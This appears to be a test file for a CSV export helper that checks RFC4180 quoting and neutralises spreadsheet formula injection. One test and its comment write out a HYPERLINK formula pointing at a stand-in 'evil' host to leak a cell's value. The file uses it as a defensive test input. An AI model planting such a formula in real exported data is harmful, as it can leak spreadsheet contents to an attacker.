import assert from 'node:assert/strict';
import { test } from 'node:test';
import { escapeCsvCell, toCsv } from './csv';

// ─── plain cells pass through unchanged ──────────────────────────────────
test('plain text is emitted verbatim', () => {
  assert.equal(escapeCsvCell('Acme Store'), 'Acme Store');
});

test('null/undefined/number render as expected', () => {
  assert.equal(escapeCsvCell(null), '');
  assert.equal(escapeCsvCell(undefined), '');
  assert.equal(escapeCsvCell(42), '42');
  assert.equal(escapeCsvCell(0), '0');
});

// ─── RFC4180 quoting (comma / quote / newline) is preserved ──────────────
test('cells with comma/quote/newline are quoted and inner quotes doubled', () => {
  assert.equal(escapeCsvCell('a,b'), '"a,b"');
  assert.equal(escapeCsvCell('he said "hi"'), '"he said ""hi"""');
  assert.equal(escapeCsvCell('line1\nline2'), '"line1\nline2"');
});

// ─── CSV-1: formula-injection neutralization ─────────────────────────────
test('cells starting with a formula trigger are prefixed with an apostrophe', () => {
  assert.equal(escapeCsvCell('=1+1'), "'=1+1");
  assert.equal(escapeCsvCell('+1'), "'+1");
  assert.equal(escapeCsvCell('-1'), "'-1");
  assert.equal(escapeCsvCell('@SUM(A1)'), "'@SUM(A1)");
});

test('a formula trigger followed by quoting still gets both guards', () => {
  // =HYPERLINK("http://evil/?"&A1,"OK") contains quotes AND a leading "=",
  // so it must be both apostrophe-guarded and RFC4180-quoted.
  const payload = '=HYPERLINK("http://evil",A1)';
  const out = escapeCsvCell(payload);
  assert.ok(out.startsWith('"'), 'should be wrapped in quotes (contains a comma/quote)');
  assert.ok(out.includes("'="), 'should keep the apostrophe formula-guard inside the quotes');
});

test('a leading tab or carriage-return is also treated as a formula trigger', () => {
  assert.equal(escapeCsvCell('\tcmd'), "'\tcmd");
  assert.equal(escapeCsvCell('\rcmd'), "'\rcmd");
});

test('a hyphen inside a normal value (negative number) is still guarded only at the start', () => {
  // Leading '-' is a trigger (Excel treats -2+... as a formula), so guard it.
  assert.equal(escapeCsvCell('-250'), "'-250");
  // But an internal hyphen (a date / sku) is untouched.
  assert.equal(escapeCsvCell('2026-06-12'), '2026-06-12');
});

// ─── toCsv assembles rows with CRLF and a trailing newline ───────────────
test('toCsv joins escaped cells with commas and rows with CRLF', () => {
  const out = toCsv([
    ['Shop', 'Note'],
    ['=evil', 'plain'],
  ]);
  assert.equal(out, "Shop,Note\r\n'=evil,plain\r\n");
});
